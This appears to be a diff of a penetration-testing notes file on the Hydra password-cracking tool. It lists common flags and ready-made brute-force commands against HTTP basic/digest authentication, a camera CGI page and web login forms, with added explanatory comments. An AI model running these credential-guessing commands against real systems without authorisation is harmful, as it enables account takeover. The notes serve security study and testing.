@@ -1,8 +1,11 @@
 # Hydra Notes
 
-
-
-Here are common, general flags used with Hydra:
+Hydra is a very useful software when it comes to bruteforce credentials
+on most commonly used protocols.
+We are going to start with some flags which are generally used independently
+from the protocol, so in the examples when we will see these flags, we can
+immediately understand what they are used for.
+Here is a list of common and general flags used with Hydra:
 
 * `-L <filepath>` for the file path to use for usernames, separated by newlines
 * `-P <filepath>` for the file path to use for passwords, separated by newlines
@@ -30,8 +33,6 @@ Here are common, general flags used with Hydra:
     single correct credential pair, so as soon as it succeeds it exits, this
     happens per host if we specify -M (so a set of machines)
 * `-F` exits after the first found login/password pair for any host (for usage with -M)
-
-
 
 
 ## HTTP
@@ -72,10 +73,18 @@ hydra -L users.txt -P words.txt www.site.com -e ns http-head /private/
 
 ```sh
 hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
+# uses the username root with passwords from the file called test.txt
+# it runs in verbose mode on localhost through http-get module we specify
+# that this is an HTTP digest authentication found at path /forbidden-d2
 ```
 
 ```sh
 hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi
+# uses the username admin with passwords from the file called
+# 1000_common_passwords.txt it runs on port 8090 through 
+# the -f flag it will stop as soon as it finds the first valid credentials
+# the http-get module is specified to denote the presence of an HTTP digest
+# authentication at the path /get_camera_params.cgi
 ```
 
 
@@ -93,7 +102,7 @@ hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
 "index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
 ```
 
-Where dependinng on the webpage and on the post we can have after url:
+Where depending on the webpage and on the post we can have after url:
 * http-get-form, in case of an http page with a get form
 * https-get-form, in case of an https page with a get form
 * http-post-form, in case of an http page with a post form
@@ -136,9 +145,9 @@ hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=val
 
 ### HTTP Get Login Forms
 
-
 ```sh
-hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com http-get-form "/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
+hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
+http-get-form "/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
 ```
 
 ```sh
@@ -153,7 +162,9 @@ hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists
 ### HTTP Post Login Forms
 
 ```sh
-hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" \
+-L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+# Here we specified:
  # Host = 192.168.1.69
  # Method = http-form-post
  # URL = /w3af/bruteforce/form_login/dataReceptor.php
@@ -170,7 +181,8 @@ We can make more complicated examples, for example by specifying specific
 headers or cookies with:
 
 ```sh
-hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" -L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
+hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" \
+-L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
  # in this case we specify that the cookie should be page/cookie
  # cookies can be specified with C=
  # and we also added an header with H= 
